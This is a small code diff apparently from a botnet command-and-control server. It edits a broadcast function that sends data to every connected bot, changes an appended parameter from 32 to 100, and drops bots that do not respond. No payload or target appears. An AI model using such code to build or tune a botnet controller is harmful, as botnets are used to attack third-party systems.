@@ -358,7 +358,7 @@ def broadcast(data):
     dead_bots = []
     for bot in bots.keys():
         try:
-            send(bot, f'{data} 32', False, False)
+            send(bot, f'{data} 100', False, False)
         except:
             dead_bots.append(bot)
     for bot in dead_bots:
